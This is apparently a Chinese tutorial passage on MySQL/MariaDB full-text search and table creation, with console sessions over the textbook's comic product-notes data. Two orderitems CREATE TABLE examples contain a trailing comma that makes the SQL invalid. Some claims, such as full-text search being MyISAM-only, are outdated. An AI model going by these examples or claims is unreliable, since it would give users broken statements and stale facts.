关键字,它利用通配操作符匹配文本(和部分文本)。使用 LIKE ,能够查找包含特殊值或部分值的行(不管这些值位于列内什么位置)。 还学习了,用基于文本的搜索作为正则表达式匹配列值的更进一步的介绍。使用正则表达式,可以编写查找所需行的非常复杂的匹配模式。 虽然这些搜索机制非常有用,但存在几个重要的限制。 性能——通配符和正则表达式匹配通常要求MySQL尝试匹配表中所有行(而且这些搜索极少使用表索引)。因此,由于被搜索行数不断增加,这些搜索可能非常耗时。 明确控制——使用通配符和正则表达式匹配,很难(而且并不总是能)明确地控制匹配什么和不匹配什么。例如,指定一个词必须匹配,一个词必须不匹配,而一个词仅在第一个词确实匹配的情况下才可以匹配或者才可以不匹配。 智能化的结果——虽然基于通配符和正则表达式的搜索提供了非常灵活的搜索,但它们都不能提供一种智能化的选择结果的方法。例如,一个特殊词的搜索将会返回包含该词的所有行,而不区分包含单个匹配的行和包含多个匹配的行(按照可能是更好的匹配来排列它们)。类似,一个特殊词的搜索将不会找出不包含该词但包含其他相关词的行。 所有这些限制以及更多的限制都可以用全文本搜索来解决。在使用全文本搜索时,MySQL不需要分别查看每个行,不需要分别分析和处理每个词。MySQL创建指定列中各词的一个索引,搜索可以针对这些词进行。这样,MySQL可以快速有效地决定哪些词匹配(哪些行包含它们),哪些词不匹配,它们匹配的频率,等等。 使用全文本搜索 为了进行全文本搜索,必须索引被搜索的列,而且要随着数据的改变不断地重新索引。在对表列进行适当设计后,MySQL会自动进行所有的索引和重新索引。 在索引之后, SELECT 可与 Match() 和 Against() 一起使用以实际执行搜索。 1.启用全文本搜索支持 一般在创建表时启用全文本搜索。 CREATE TABLE 语句接受 FULLTEXT 子句,它给出被索引列的一个逗号分隔的列表。 下面的 CREATE 语句演示了 FULLTEXT 子句的使用: 123456789101112131415161718192021222324MariaDB [test]&gt; create table productnotes1 (note_id int not null auto_increment,prod_id char(10) not null,note_date datetime not null,note_text text null,primary key(note_id),fulltext(note_text)) engine=myisam;Query OK, 0 rows affected (0.37 sec)MariaDB [test]&gt; show table status where name=&apos;productnotes1&apos;\\G;*************************** 1. row *************************** Name: productnotes1 Engine: MyISAM Version: 10 Row_format: Dynamic Rows: 0 Avg_row_length: 0 Data_length: 0Max_data_length: 281474976710655 Index_length: 1024 Data_free: 0 Auto_increment: 1 Create_time: 2016-09-20 15:20:19 Update_time: 2016-09-20 15:20:19 Check_time: NULL Collation: latin1_swedish_ci Checksum: NULL Create_options: Comment:1 row in set (0.00 sec) 后面将详细考察 CREATE TABLE 语句。现在,只需知道这条CREATE TABLE 语句定义表 productnotes1 并列出它所包含的列即可。这些列中有一个名为 note_text 的列,为了进行全文本搜索,MySQL根据子句 FULLTEXT(note_text) 的指示对它进行索引。这里的FULLTEXT 索引单个列,如果需要也可以指定多个列。 在定义之后,MySQL自动维护该索引。在增加、更新或删除行时,索引随之自动更新。可以在创建表时指定 FULLTEXT ,或者在稍后指定(在这种情况下所有已有数据必须立即索引)。 不要在导入数据时使用 FULLTEXT 更新索引要花时间,虽然不是很多,但毕竟要花时间。如果正在导入数据到一个新表,此时不应该启用 FULLTEXT 索引。应该首先导入所有数据,然后再修改表,定义FULLTEXT 。这样有助于更快地导入数据(而且使索引数据的总时间小于在导入每行时分别进行索引所需的总时间) 2.进行全文本搜索 在索引之后,使用两个函数 Match() 和 Against() 执行全文本搜索,其中 Match() 指定被搜索的列, Against() 指定要使用的搜索表达式。 下面举一个例子: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849MariaDB [test]&gt; select * from productnotes;+---------+---------+---------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------+| note_id | prod_id | note_date | note_text |+---------+---------+---------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------+| 101 | TNT2 | 2005-08-17 00:00:00 | Customer complaint:Sticks not individually wrapped, too easy to mistakenly detonate all at once.Recommend individual wrapping. || 102 | OL1 | 2005-08-18 00:00:00 | Can shipped full, refills not available.Need to order new can if refill needed. || 103 | SAFE | 2005-08-18 00:00:00 | Safe is combination locked, combination not provided with safe.This is rarely a problem as safes are typically blown up or dropped by customers. || 104 | FC | 2005-08-19 00:00:00 | Quantity varies, sold by the sack load.All guaranteed to be bright and orange, and suitable for use as rabbit bait. || 105 | TNT2 | 2005-08-20 00:00:00 | Included fuses are short and have been known to detonate too quickly for some customers.Longer fuses are available (item FU1) and should be recommended. || 106 | TNT2 | 2005-08-22 00:00:00 | Matches not included, recommend purchase of matches or detonator (item DTNTR). || 107 | SAFE | 2005-08-23 00:00:00 | Please note that no returns will be accepted if safe opened using explosives. || 108 | ANV01 | 2005-08-25 00:00:00 | Multiple customer returns, anvils failing to drop fast enough or falling backwards on purchaser. Recommend that customer considers using heavier anvils. || 109 | ANV03 | 2005-09-01 00:00:00 | Item is extremely heavy. Designed for dropping, not recommended for use with slings, ropes, pulleys, or tightropes. || 110 | FC | 2005-09-01 00:00:00 | Customer complaint: rabbit has been able to detect trap, food apparently less effective now. || 111 | SLING | 2005-09-02 00:00:00 | Shipped unassembled, requires common tools (including oversized hammer). || 112 | SAFE | 2005-09-02 00:00:00 | Customer complaint:Circular hole in safe floor can apparently be easily cut with handsaw. || 113 | ANV01 | 2005-09-05 00:00:00 | Customer complaint:Not heavy enough to generate flying stars around head of victim. If being purchased for dropping, recommend ANV02 or ANV03 instead. || 114 | SAFE | 2005-09-07 00:00:00 | Call from individual trapped in safe plummeting to the ground, suggests an escape hatch be added.Comment forwarded to vendor. |+---------+---------+---------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------+14 rows in set (0.00 sec)MariaDB [test]&gt; select note_text from productnotes where note_text regexp &apos;rabbit&apos;;+----------------------------------------------------------------------------------------------------------------------+| note_text |+----------------------------------------------------------------------------------------------------------------------+| Quantity varies, sold by the sack load.All guaranteed to be bright and orange, and suitable for use as rabbit bait. || Customer complaint: rabbit has been able to detect trap, food apparently less effective now. |+----------------------------------------------------------------------------------------------------------------------+2 rows in set (0.00 sec)MariaDB [test]&gt; select note_text from productnotes where match(note_text) against(&apos;rabbit&apos;);+----------------------------------------------------------------------------------------------------------------------+| note_text |+----------------------------------------------------------------------------------------------------------------------+| Customer complaint: rabbit has been able to detect trap, food apparently less effective now. || Quantity varies, sold by the sack load.All guaranteed to be bright and orange, and suitable for use as rabbit bait. |+----------------------------------------------------------------------------------------------------------------------+2 rows in set (0.00 sec) 此 SELECT 语句检索单个列 note_text 。由于 WHERE 子句,一个全文本搜索被执行。 Match(note_text) 指示MySQL针对指定的列进行搜索, Against(&apos;rabbit&apos;) 指定词 rabbit 作为搜索文本。由于有两行包含词 rabbit ,这两个行被返回。 使用完整的Match()说明 传递给 Match() 的值必须与FULLTEXT() 定义中的相同。如果指定多个列,则必须列出它们(而且次序正确)。 搜索不区分大小写 除非使用 BINARY 方式(本章中没有介绍),否则全文本搜索不区分大小写。 事实是刚才的搜索可以简单地用 LIKE 子句完成,如下所示: 123456789MariaDB [test]&gt; select note_text from productnotes where note_text like &apos;%rabbit%&apos;;+----------------------------------------------------------------------------------------------------------------------+| note_text |+----------------------------------------------------------------------------------------------------------------------+| Quantity varies, sold by the sack load.All guaranteed to be bright and orange, and suitable for use as rabbit bait. || Customer complaint: rabbit has been able to detect trap, food apparently less effective now. |+----------------------------------------------------------------------------------------------------------------------+2 rows in set (0.00 sec) 这条 SELECT 语句同样检索出两行,但次序不同(虽然并不总是出现这种情况)。 上述两条 SELECT 语句都不包含 ORDER BY 子句。后者(使用 LIKE )以不特别有用的顺序返回数据。前者(使用全文本搜索)返回以文本匹配的良好程度排序的数据。两个行都包含词 rabbit ,但包含词 rabbit 作为第3个词的行的等级比作为第20个词的行高。这很重要。全文本搜索的一个重要部分就是对结果排序。具有较高等级的行先返回(因为这些行很可能是你真正想要的行)。 为演示排序如何工作,请看以下例子: 1234567891011121314151617181920212223242526272829MariaDB [test]&gt; select note_text,match(note_text) against(&apos;rabbit&apos;) as rank from productnotes;+-----------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+| note_text | rank |+-----------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+| Customer complaint:Sticks not individually wrapped, too easy to mistakenly detonate all at once.Recommend individual wrapping. | 0 || Can shipped full, refills not available.Need to order new can if refill needed. | 0 || Safe is combination locked, combination not provided with safe.This is rarely a problem as safes are typically blown up or dropped by customers. | 0 || Quantity varies, sold by the sack load.All guaranteed to be bright and orange, and suitable for use as rabbit bait. | 1.5905543565750122 || Included fuses are short and have been known to detonate too quickly for some customers.Longer fuses are available (item FU1) and should be recommended. | 0 || Matches not included, recommend purchase of matches or detonator (item DTNTR). | 0 || Please note that no returns will be accepted if safe opened using explosives. | 0 || Multiple customer returns, anvils failing to drop fast enough or falling backwards on purchaser. Recommend that customer considers using heavier anvils. | 0 || Item is extremely heavy. Designed for dropping, not recommended for use with slings, ropes, pulleys, or tightropes. | 0 || Customer complaint: rabbit has been able to detect trap, food apparently less effective now. | 1.6408053636550903 || Shipped unassembled, requires common tools (including oversized hammer). | 0 || Customer complaint:Circular hole in safe floor can apparently be easily cut with handsaw. | 0 || Customer complaint:Not heavy enough to generate flying stars around head of victim. If being purchased for dropping, recommend ANV02 or ANV03 instead. | 0 || Call from individual trapped in safe plummeting to the ground, suggests an escape hatch be added.Comment forwarded to vendor. | 0 |+-----------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+14 rows in set (0.00 sec) 这里,在 SELECT 而不是 WHERE 子句中使用 Match() 和 Against() 。这使所有行都被返回(因为没有 WHERE 子句)。 Match() 和 Against()用来建立一个计算列(别名为 rank ),此列包含全文本搜索计算出的等级值。等级由MySQL根据行中词的数目、唯一词的数目、整个索引中词的总数以及包含该词的行的数目计算出来。正如所见,不包含词 rabbit 的行等级为0(因此不被前一例子中的 WHERE 子句选择)。确实包含词 rabbit的两个行每行都有一个等级值,文本中词靠前的行的等级值比词靠后的行的等级值高。 这个例子有助于说明全文本搜索如何排除行(排除那些等级为0的行),如何排序结果(按等级以降序排序)。 排序多个搜索项 如果指定多个搜索项,则包含多数匹配词的那些行将具有比包含较少词(或仅有一个匹配)的那些行高的等级值。 正如所见,全文本搜索提供了简单 LIKE 搜索不能提供的功能。而且,由于数据是索引的,全文本搜索还相当快。 3.使用查询扩展 查询扩展用来设法放宽所返回的全文本搜索结果的范围。考虑下面的情况。你想找出所有提到 anvils 的注释。只有一个注释包含词 anvils ,但你还想找出可能与你的搜索有关的所有其他行,即使它们不包含词anvils 。 这也是查询扩展的一项任务。在使用查询扩展时,MySQL对数据和索引进行两遍扫描来完成搜索: 首先,进行一个基本的全文本搜索,找出与搜索条件匹配的所有行; 其次,MySQL检查这些匹配行并选择所有有用的词(我们将会简要地解释MySQL如何断定什么有用,什么无用)。 再其次, MySQL再次进行全文本搜索,这次不仅使用原来的条件,而且还使用所有有用的词。 利用查询扩展,能找出可能相关的结果,即使它们并不精确包含所查找的词。 只用于MySQL版本4.1.1或更高级的版本 查询扩展功能是在MySQL 4.1.1中引入的,因此不能用于之前的版本。 下面举一个例子,首先进行一个简单的全文本搜索,没有查询扩展: 1234567MariaDB [test]&gt; select note_text from productnotes where match(note_text) against(&apos;anvils&apos;);+----------------------------------------------------------------------------------------------------------------------------------------------------------+| note_text |+----------------------------------------------------------------------------------------------------------------------------------------------------------+| Multiple customer returns, anvils failing to drop fast enough or falling backwards on purchaser. Recommend that customer considers using heavier anvils. |+----------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec) 只有一行包含词 anvils ,因此只返回一行。 下面是相同的搜索,这次使用查询扩展: 1234567891011121314151617MariaDB [test]&gt; select note_text from productnotes where match(note_text) against(&apos;anvils&apos; with query expansion);+----------------------------------------------------------------------------------------------------------------------------------------------------------+| note_text |+----------------------------------------------------------------------------------------------------------------------------------------------------------+| Multiple customer returns, anvils failing to drop fast enough or falling backwards on purchaser. Recommend that customer considers using heavier anvils. || Customer complaint:Sticks not individually wrapped, too easy to mistakenly detonate all at once.Recommend individual wrapping. || Customer complaint:Not heavy enough to generate flying stars around head of victim. If being purchased for dropping, recommend ANV02 or ANV03 instead. || Please note that no returns will be accepted if safe opened using explosives. || Customer complaint: rabbit has been able to detect trap, food apparently less effective now. || Customer complaint:Circular hole in safe floor can apparently be easily cut with handsaw. || Matches not included, recommend purchase of matches or detonator (item DTNTR). |+----------------------------------------------------------------------------------------------------------------------------------------------------------+7 rows in set (0.00 sec) 这次返回了7行。第一行包含词 anvils ,因此等级最高。第二行与 anvils 无关,但因为它包含第一行中的两个词( customer和 recommend ),所以也被检索出来。第3行也包含这两个相同的词,但它们在文本中的位置更靠后且分开得更远,因此也包含这一行,但等级为第三。第三行确实也没有涉及 anvils (按它们的产品名)。 正如所见,查询扩展极大地增加了返回的行数,但这样做也增加了你实际上并不想要的行的数目。 行越多越好 表中的行越多(这些行中的文本就越多),使用查询扩展返回的结果越好。 4.布尔文本搜索 MySQL支持全文本搜索的另外一种形式,称为布尔方式(boolean mode)。 以布尔方式,可以提供关于如下内容的细节: 要匹配的词; 要排斥的词(如果某行包含这个词,则不返回该行,即使它包含其他指定的词也是如此); 排列提示(指定某些词比其他词更重要,更重要的词等级更高); 表达式分组; 另外一些内容。 即使没有 FULLTEXT 索引也可以使用 布尔方式不同于迄今为止使用的全文本搜索语法的地方在于,即使没有定义FULLTEXT 索引,也可以使用它。但这是一种非常缓慢的操作(其性能将随着数据量的增加而降低)。 为演示 IN BOOLEAN MODE 的作用,举一个简单的例子: 123456789MariaDB [test]&gt; select note_text from productnotes where match(note_text) against(&apos;heavy&apos; in boolean mode);+---------------------------------------------------------------------------------------------------------------------------------------------------------+| note_text |+---------------------------------------------------------------------------------------------------------------------------------------------------------+| Item is extremely heavy. Designed for dropping, not recommended for use with slings, ropes, pulleys, or tightropes. || Customer complaint:Not heavy enough to generate flying stars around head of victim. If being purchased for dropping, recommend ANV02 or ANV03 instead. |+---------------------------------------------------------------------------------------------------------------------------------------------------------+2 rows in set (0.00 sec) 此全文本搜索检索包含词 heavy 的所有行(有两行)。其中使用了关键字 IN BOOLEAN MODE ,但实际上没有指定布尔操作符,因此,其结果与没有指定布尔方式的结果相同。 IN BOOLEAN MODE 的行为差异 虽然这个例子的结果与没有IN BOOLEAN MODE 的相同,但其行为有一个重要的差别(即使在这个特殊的例子没有表现出来)。 为了匹配包含 heavy 但不包含任意以 rope 开始的词的行,可使用以下查询: 12345678MariaDB [test]&gt; select note_text from productnotes where match(note_text) against(&apos;heavy -rope*&apos; in boolean mode);+---------------------------------------------------------------------------------------------------------------------------------------------------------+| note_text |+---------------------------------------------------------------------------------------------------------------------------------------------------------+| Customer complaint:Not heavy enough to generate flying stars around head of victim. If being purchased for dropping, recommend ANV02 or ANV03 instead. |+---------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec) 这次只返回一行。这一次仍然匹配词 heavy ,但 -rope* 明确地指示 MySQL排除 包含 rope* (任何以 rope 开始 的词,包 括ropes )的行,这就是为什么上一个例子中的第一行被排除的原因。 在MySQL 4.x中所需的代码更改 如果你使用的是MySQL4.x,则上面的例子可能不返回任何行。这是 * 操作符处理中的一个错误。为在MySQL 4.x中使用这个例子,使用 -ropes 而不是 -rope* (排除 ropes 而不是排除任何以 rope 开始的词)。 全文本布尔操作符 说明 + 包含,词必须存在 - 排除,词必须不出现 &gt; 包含,而且增加等级值 &lt; 包含,且减少等级值 () 把词组成子表达式(允许这些子表达式作为一个组被包含、排除、排列等) ~ 取消一个词的排序值 * 词尾的通配符 “” 定义一个短语(与单个词的列表不一样,它匹配整个短语以便包含或排除这个短语) 下面举几个例子,说明某些操作符如何使用: 搜索匹配包含词 rabbit 和 bait 的行。 12345678MariaDB [test]&gt; select note_text from productnotes where match(note_text) against(&apos;+rabbit +bait&apos; in boolean mode);+----------------------------------------------------------------------------------------------------------------------+| note_text |+----------------------------------------------------------------------------------------------------------------------+| Quantity varies, sold by the sack load.All guaranteed to be bright and orange, and suitable for use as rabbit bait. |+----------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec) 搜索匹配包含 rabbit 和 bait 中的至少一个词的行。 123456789MariaDB [test]&gt; select note_text from productnotes where match(note_text) against(&apos;rabbit bait&apos; in boolean mode);+----------------------------------------------------------------------------------------------------------------------+| note_text |+----------------------------------------------------------------------------------------------------------------------+| Quantity varies, sold by the sack load.All guaranteed to be bright and orange, and suitable for use as rabbit bait. || Customer complaint: rabbit has been able to detect trap, food apparently less effective now. |+----------------------------------------------------------------------------------------------------------------------+2 rows in set (0.00 sec) 搜索匹配短语 rabbit bait 而不是匹配两个词 rabbit 和 bait 。 12345678MariaDB [test]&gt; select note_text from productnotes where match(note_text) against(&apos;&quot;rabbit bait&quot;&apos; in boolean mode);+----------------------------------------------------------------------------------------------------------------------+| note_text |+----------------------------------------------------------------------------------------------------------------------+| Quantity varies, sold by the sack load.All guaranteed to be bright and orange, and suitable for use as rabbit bait. |+----------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec) 搜索匹配 rabbit 和 carrot ,增加前者的等级,降低后者的等级。 123456789MariaDB [test]&gt; select note_text from productnotes where match(note_text) against(&apos;&gt;rabbit &lt;carrot&apos; in boolean mode);+----------------------------------------------------------------------------------------------------------------------+| note_text |+----------------------------------------------------------------------------------------------------------------------+| Quantity varies, sold by the sack load.All guaranteed to be bright and orange, and suitable for use as rabbit bait. || Customer complaint: rabbit has been able to detect trap, food apparently less effective now. |+----------------------------------------------------------------------------------------------------------------------+2 rows in set (0.00 sec) 搜索匹配词 safe 和 combination ,降低后者的等级。 12345678MariaDB [test]&gt; select note_text from productnotes where match(note_text) against(&apos;+safe +(&lt;combination)&apos; in boolean mode);+---------------------------------------------------------------------------------------------------------------------------------------------------+| note_text |+---------------------------------------------------------------------------------------------------------------------------------------------------+| Safe is combination locked, combination not provided with safe.This is rarely a problem as safes are typically blown up or dropped by customers. |+---------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec) 排列而不排序 在布尔方式中,不按等级值降序排序返回的行。 5.全文本搜索的使用说明 在结束本章之前,给出关于全文本搜索的某些重要的说明。 在索引全文本数据时,短词被忽略且从索引中排除。短词定义为那些具有3个或3个以下字符的词(如果需要,这个数目可以更改)。 MySQL带有一个内建的非用词(stopword)列表,这些词在索引全文本数据时总是被忽略。如果需要,可以覆盖这个列表(请参阅MySQL文档以了解如何完成此工作)。 许多词出现的频率很高,搜索它们没有用处(返回太多的结果)。因此,MySQL规定了一条50%规则,如果一个词出现在50%以上的行中,则将它作为一个非用词忽略。 50%规则不用于 IN BOOLEANMODE 。 如果表中的行数少于3行,则全文本搜索不返回结果(因为每个词或者不出现,或者至少出现在50%的行中)。 忽略词中的单引号。例如, don’t 索引为 dont 。 不具有词分隔符(包括日语和汉语)的语言不能恰当地返回全文本搜索结果。 如前所述,仅在 MyISAM 数据库引擎中支持全文本搜索。 没有邻近操作符 邻近搜索是许多全文本搜索支持的一个特性,它能搜索相邻的词(在相同的句子中、相同的段落中或者在特定数目的词的部分中,等等)。MySQL全文本搜索现在还不支持邻近操作符,不过未来的版本有支持这种操作符的计划。 小结 本章介绍了为什么要使用全文本搜索,以及如何使用MySQL的Match() 和 Against() 函数进行全文本搜索。我们还学习了查询扩展(它能增加找到相关匹配的机会)和如何使用布尔方式进行更细致的查找控制。 DDL语言 DDL 是数据定义语言的缩写,简单来说,就是对数据库内部的对象进行创建、删除、修改的操作语言。它和 DML 语言的最大区别是 DML 只是对表内部数据的操作,而不涉及到表的定义、结构的修改,更不会涉及到其他对象。 DDL 语句更多的被数据库管理员(DBA)所使用,一般的开发人员很少使用。 创建和操纵表本章讲授表的创建、更改和删除的基本知识。 创建表 MySQL不仅用于表数据操纵,而且还可以用来执行数据库和表的所有操作,包括表本身的创建和处理。 一般有两种创建表的方法: 使用具有交互式创建和管理表的工具(如第2章讨论的工具); 表也可以直接用MySQL语句操纵。 为了用程序创建表,可使用SQL的 CREATE TABLE 语句。值得注意的是,在使用交互式工具时,实际上使用的是MySQL语句。但是,这些语句不是用户编写的,界面工具会自动生成并执行相应的MySQL语句(更改现有表时也是这样)。 1.表创建基础 为利用 CREATE TABLE 创建表,必须给出下列信息: 新表的名字,在关键字 CREATE TABLE 之后给出; 表列的名字和定义,用逗号分隔。 CREATE TABLE 语句也可能会包括其他关键字或选项,但至少要包括表的名字和列的细节。下面的MySQL语句创建我们所用的 customers 表: 12345678910111213MariaDB [test]&gt; create table customers -&gt; ( -&gt; cust_id int not null auto_increment, -&gt; cust_name char(50) not null, -&gt; cust_address char(50) null, -&gt; cust_city char(50) null, -&gt; cust_state char(5) null, -&gt; cust_zip char(10) null, -&gt; cust_country char(50) null, -&gt; cust_contact char(50) null, -&gt; cust_email char(255) null, -&gt; primary key (cust_id) -&gt; ) engine=innodb; 从上面的例子中可以看到,表名紧跟在 CREATE TABLE 关键字后面。实际的表定义(所有列)括在圆括号之中。各列之间用逗号分隔。这个表由9列组成。每列的定义以列名(它在表中必须是唯一的)开始,后跟列的数据类型(关于数据类型的解释,请参阅第1章。此外,附录D列出了MySQL支持的数据类型)。表的主键可以在创建表时用PRIMARY KEY 关键字指定。这里,列 cust_id 指定作为主键列。整条语句由右圆括号后的分号结束。( 现在先忽略ENGINE=InnoDB 和AUTO_INCREMENT ,后面会对它们进行介绍。) 语句格式化 可回忆一下,以前说过MySQL语句中忽略空格。语句可以在一个长行上输入,也可以分成许多行。它们的作用都相同。这允许你以最适合自己的方式安排语句的格式。前面的 CREATE TABLE 语句就是语句格式化的一个很好的例子,它被安排在多个行上,其中的列定义进行了恰当的缩进,以便阅读和编辑。以何种缩进格式安排SQL语句没有规定,但我强烈推荐采用某种缩进格式。 处理现有的表 在创建新表时,指定的表名必须不存在,否则将出错。如果要防止意外覆盖已有的表,SQL要求首先手工删除该表,然后再重建它,而不是简单地用创建表语句覆盖它。如果你仅想在一个表不存在时创建它,应该在表名后给出 IF NOT EXISTS 。这样做不检查已有表的模式是否与你打算创建的表模式相匹配。它只是查看表名是否存在,并且仅在表名不存在时创建它。 1234567891011DROP TABLE IF EXISTS columns_priv;CREATE TABLE columns_priv ( Host char(60) COLLATE utf8_bin NOT NULL DEFAULT &apos;&apos;, Db char(64) COLLATE utf8_bin NOT NULL DEFAULT &apos;&apos;, User char(16) COLLATE utf8_bin NOT NULL DEFAULT &apos;&apos;, Table_name char(64) COLLATE utf8_bin NOT NULL DEFAULT &apos;&apos;, Column_name char(64) COLLATE utf8_bin NOT NULL DEFAULT &apos;&apos;, Timestamp timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, Column_priv set(&apos;Select&apos;,&apos;Insert&apos;,&apos;Update&apos;,&apos;References&apos;) CHARACTER SET utf8 NOT NULL DEFAULT &apos;&apos;, PRIMARY KEY (Host,Db,User,Table_name,Column_name)) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=&apos;Column privileges&apos;;2.使用 NULL 值 前面章节中说过, NULL 值就是没有值或缺值。允许 NULL 值的列也允许在插入行时不给出该列的值。不允许 NULL 值的列不接受该列没有值的行,换句话说,在插入或更新行时,该列必须有值。 每个表列或者是 NULL 列,或者是 NOT NULL 列,这种状态在创建时由表的定义规定。请看下面的例子: 创建 orders 表 1234567MariaDB [test]&gt; create table orders -&gt; ( -&gt; order_num int not null auto_increment, -&gt; order_date datetime not null, -&gt; cust_id int not null, -&gt; primary key (order_num) -&gt; ) engine=innodb; orders 包含3个列,分别是订单号、订单日期和客户ID。所有3个列都需要,因此每个列的定义都含有关键字 NOT NULL 。这将会阻止插入没有值的列。如果试图插入没有值的列,将返回错误,且插入失败。 创建 vendors 表 12345678910CREATE TABLE vendors ( vend_id int NOT NULL AUTO_INCREMENT, vend_name char(50) NOT NULL, vend_address char(50) NULL, vend_city char(50) NULL, vend_state char(5) NULL, vend_zip char(10) NULL, vend_country char(50) NULL, PRIMARY KEY (vend_id)) ENGINE=InnoDB; 供应商ID和供应商名字列是必需的,因此指定为 NOT NULL 。其余5个列全都允许 NULL 值,所以不指定 NOT NULL 。NULL 为默认设置,如果不指定 NOT NULL ,则认为指定的是 NULL 。 理解 NULL 不要把 NULL 值与空串相混淆。 NULL 值是没有值,它不是空串。如果指定 ‘’ (两个单引号,其间没有字符),这在 NOT NULL 列中是允许的。空串是一个有效的值,它不是无值。 NULL 值用关键字 NULL 而不是空串指定。 3.主键再介绍 正如所述,主键值必须唯一。即,表中的每个行必须具有唯一的主键值。如果主键使用单个列,则它的值必须唯一。如果使用多个列,则这些列的组合值必须唯一。 迄今为止我们看到的 CREATE TABLE 例子都是用单个列作为主键。其中主键用以下的类似的语句定义:primary key (vend_id) 为创建由多个列组成的主键,应该以逗号分隔的列表给出各列名,如下所示: 12345678CREATE TABLE orderitems ( order_num int NOT NULL, order_item int NOT NULL, prod_id char(10) NOT NULL, quantity int NOT NULL, item_price decimal(8,2) NOT NULL, PRIMARY KEY (order_num,order_item), ) ENGINE=InnoDB; orderitems 表包含orders表中每个订单的细节。每个订单有多项物品,但每个订单任何时候都只有1个第一项物品,1个第二项物品,如此等等。因此,订单号( order_num 列)和订单物品( order_item 列)的组合是唯一的,从而适合作为主键,其定义为:RIMARY KEY (order_num,order_item) 主键可以在创建表时定义(如这里所示),或者在创建表之后定义(本章稍后讨论)。 4.使用 AUTO_INCREMENT 让我们再次考察 customers 和 orders表。 customers 表中的顾客由列cust_id 唯一标识,每个顾客有一个唯一编号。类似, orders 表中的每个订单有一个唯一的订单号,这个订单号存储在列 order_num 中。这些编号除它们是唯一的以外没有别的特殊意义。在增加一个新顾客或新订单时,需要一个新的顾客ID或订单号。这些编号可以任意,只要它们是唯一的即可。 显然,使用的最简单的编号是下一个编号,所谓下一个编号是大于当前最大编号的编号。例如,如果 cust_id 的最大编号为 10005 ,则插入表中的下一个顾客可以具有等于 10006 的 cust_id 。 简单吗?不见得。你怎样确定下一个要使用的值?当然,你可以使用 SELECT语句得出最大的数,然后对它加1。但这样做并不可靠(你需要找出一种办法来保证,在你执行 SELECT和 INSERT 两条语句之间没有其他人插入行,对于多用户应用,这种情况是很有可能出现的),而且效率也不高(执行额外的MySQL操作肯定不是理想的办法)。 这就是 AUTO_INCREMENT 发挥作用的时候了。请看以下代码行(用来创建 customers 表的 CREATE TABLE 语句的组成部分):cust_id int NOT NULL AUTO_INCREMENT AUTO_INCREMENT 告诉MySQL,本列每当增加一行时自动增量。每次执行一个 INSERT 操作时,MySQL自动对该列增量(从而才有这个关键字AUTO_INCREMENT ),给该列赋予下一个可用的值。这样给每个行分配一个唯一的cust_id,从而可以用作主键值。 每个表只允许一个 AUTO_INCREMENT 列,而且它必须被索引(如,通过使它成为主键) 覆 盖 AUTO_INCREMENT 如果一个列被指定为 AUTO_INCREMENT ,则它需要使用特殊的值吗?你可以简单地在 INSERT 语句中指定一个值,只要它是唯一的(至今尚未使用过)即可,该值将被用来替代自动生成的值。后续的增量将开始使用该手工插入的值。 确定 AUTO_INCREMENT 值 让MySQL生成(通过自动增量)主键的一个缺点是你不知道这些值都是谁。 考虑这个场景:你正在增加一个新订单。这要求在 orders 表中创建一行,然后在 orderitms 表中对订购的每项物品创建一行。 order_num 在 orderitems 表中与订单细节一起存储。这就是为什么 orders 表和 orderitems 表为相互关联的表的原因。这显然要求你在插入 orders 行之后,插入 orderitems 行之前知道生成的 order_num 。那么,如何在使用 AUTO_INCREMENT 列时获得这个值呢?可使用 last_insert_id() 函数获得这个值,如下所示:select last_insert_id()此语句返回最后一个 AUTO_INCREMENT 值,然后可以将它用于后续的MySQL语句。 5.指定默认值 如果在插入行时没有给出值,MySQL允许指定此时使用的默认值。默认值用 CREATE TABLE 语句的列定义中的 DEFAULT 关键字指定。 请看下面的例子: 12345678CREATE TABLE orderitems ( order_num int NOT NULL, order_item int NOT NULL, prod_id char(10) NOT NULL, quantity int NOT NULL default 1, item_price decimal(8,2) NOT NULL, PRIMARY KEY (order_num,order_item), ) ENGINE=InnoDB; 这条语句创建包含组成订单的各物品的 orderitems 表(订单本身存储在 orders 表中)。 quantity 列包含订单中每项物品的数量。在此例子中,给该列的描述添加文本 DEFAULT 1 指示MySQL,在未给出数量的情况下使用数量 1 。 不允许函数 与大多数DBMS不一样,MySQL不允许使用函数作为默认值,它只支持常量。 使用默认值而不是 NULL 值 许多数据库开发人员使用默认值而不是 NULL 列,特别是对用于计算或数据分组的列更是如此。 6.引擎类型 你可能已经注意到,迄今为止使用的 CREATE TABLE 语句全都以ENGINE=InnoDB 语句结束。 与其他DBMS一样, MySQL有一个具体管理和处理数据的内部引擎。 在你使用 CREATE TABLE 语句时,该引擎具体创建表,而在你使用 SELECT语句或进行其他数据库处理时,该引擎在内部处理你的请求。多数时候,此引擎都隐藏在DBMS内,不需要过多关注它。 但MySQL与其他DBMS不一样,它具有多种引擎。它打包多个引擎,这些引擎都隐藏在MySQL服务器内,全都能执行 CREATE TABLE 和 SELECT等命令。 为什么要发行多种引擎呢? 因为它们具有各自不同的功能和特性,为不同的任务选择正确的引擎能获得良好的功能和灵活性。 当然,你完全可以忽略这些数据库引擎。如果省略 ENGINE= 语句,则,多数SQL语句都会默认使用它。但并使用默认引擎(很可能是 MyISAM )不是所有语句都默认使用它,这就是为什么 ENGINE= 语句很重要的原因(也就是为什么本书的样列表中使用两种引擎的原因)。 以下是几个需要知道的引擎: InnoDB 是一个可靠的事务处理引擎,它不支持全文本搜索; MEMORY 在功能等同于 MyISAM ,但由于数据存储在内存(不是磁盘)中,速度很快(特别适合于临时表); MyISAM 是一个性能极高的引擎,它支持全文本搜索,但不支持事务处理。 引擎类型可以混用。除 productnotes 表使用 MyISAM 外,本书中的样例表都使用 InnoDB 